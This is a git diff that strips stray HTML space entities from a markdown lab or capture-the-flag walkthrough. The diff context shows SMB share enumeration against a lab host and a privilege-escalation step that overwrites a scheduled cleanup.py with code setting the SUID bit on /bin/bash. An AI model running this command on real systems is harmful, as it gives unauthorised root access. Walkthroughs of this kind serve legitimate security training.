@@ -17,7 +17,7 @@ PORT     STATE SERVICE
 
 ### FTP + SMB Enumeration
 
-FTP doesn't allow for anonymous logins, but SMB does have shares we can read.&#x20;
+FTP doesn't allow for anonymous logins, but SMB does have shares we can read.
 
 ```
 $ smbmap -H 192.168.157.64         
@@ -121,12 +121,12 @@ except:
 sys.exit(0)
 ```
 
-Since there's a `sys.exit(0)` function at the end, we cannot just append code. What we can do is just create a completely new `cleanup.py` file within that directory.&#x20;
+Since there's a `sys.exit(0)` function at the end, we cannot just append code. What we can do is just create a completely new `cleanup.py` file within that directory.
 
 ```bash
 echo 'import os;os.system("chmod u+s /bin/bash")' > cleanup.py
 ```
 
-Then we can just wait for a bit for the script to execute.&#x20;
+Then we can just wait for a bit for the script to execute.
 
 <figure><img src="../../../.gitbook/assets/image (3424).png" alt=""><figcaption></figcaption></figure>
